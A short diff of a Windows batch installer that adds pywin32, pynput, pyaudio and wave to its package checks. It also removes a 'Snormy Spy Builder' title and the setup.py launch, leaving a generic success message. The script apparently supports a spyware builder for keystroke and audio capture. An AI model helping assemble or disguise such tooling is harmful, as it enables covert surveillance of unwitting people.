@@ -25,6 +25,10 @@ for %%A in (
     "pillow"
     "uuid"
     "imageio"
+    "pywin32"
+    "pynput"
+    "pyaudio"
+    "wave"
 ) do (
     echo Checking %%~A...
     python -c "import %%~A" >nul 2>&1
@@ -35,14 +39,7 @@ for %%A in (
 )
 
 cls
-title Snormy Spy Builder
-python setup.py
-if %errorlevel% neq 0 goto ERROR
-exit
-
-:ERROR
-color 4
-title [Error]
-echo An error occurred.
+title Libraries installed successfully.
+echo All modules installed and up-to-date.
 pause
 exit
